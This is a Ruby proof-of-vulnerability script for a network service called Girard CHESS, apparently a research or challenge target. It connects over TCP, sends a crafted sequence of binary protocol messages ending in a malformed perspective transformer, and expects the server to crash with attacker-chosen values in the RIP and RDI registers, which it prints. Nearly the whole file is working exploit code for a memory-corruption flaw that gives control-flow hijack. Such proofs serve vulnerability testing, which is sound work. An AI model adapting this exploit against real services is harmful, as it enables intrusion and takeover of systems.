#!/usr/bin/env ruby

##
# GirardPov: Proof of Vulnerability for the Girard CHESS service
#
#   Usage: ruby girard-pov.rb <HOST> <PORT>
##

require "socket"
require "logger"

# set up logger
LOGGER = Logger.new(STDOUT, formatter: proc { |sev, datetime, progname, msg| "#{sev}: #{msg}\n" })
LOGGER.level = Logger::INFO

# check for proper usage
host = ARGV[0] || ENV["HOST"]
port = (ARGV[1] || ENV["PORT"]).to_i()

# validate provided host
if host == nil or host == ""
    fail "invalid host (or none specified)"
end

# validate provided port
if port == nil or port <= 0 or port > 65535
    fail "invalid port (or none specified)"
end

# connect to server
LOGGER.info("HOST=#{host} PORT=#{port}")
socket = TCPSocket.new(host, port)

# request connection
socket.write("\x10")
socket.read(1)  # acknowledgement response

# create a blank image
socket.write("\x20")
socket.read(1)  # success response

# add a style
style = "\x05\xFF"
socket.write("\x43#{[style.length].pack("s<")}#{style}")
socket.read(1)  # success response

# add a path
path = "\x08\x00"
socket.write("\x63#{[path.length].pack("s<")}#{path}")
socket.read(1)  # success response

# add a shape (requires a valid style and path)
shape = "\x0A\x00\x01\x00\x00"
socket.write("\x83#{[shape.length].pack("s<")}#{shape}")
socket.read(1)  # success response

# add a perspective transformer to the shape
xformer = "\x16\x00\x00\x00\x00\x00\x00\x00\x1e\xab\x11\xca\x00\x00\x00\x00\xe5\x55\xce\xac\x7e\x1e\x50\x0b\x00\x00\x00\x00".force_encoding("BINARY")
socket.write("\x97#{[xformer.length + 2].pack("s<")}\x00\x00".force_encoding("BINARY") + xformer)
socket.read(1)  # success response

# transform the server's perspective
socket.write("\x95\x00\x00")
LOGGER.info("if not patched, we should have segfaulted with our data now")
puts "REGISTER_RIP=#{xformer[8..15].unpack("Q<")[0].to_s(16)}"
puts "REGISTER_RDI=#{xformer[16..23].unpack("Q<")[0].to_s(16)}"
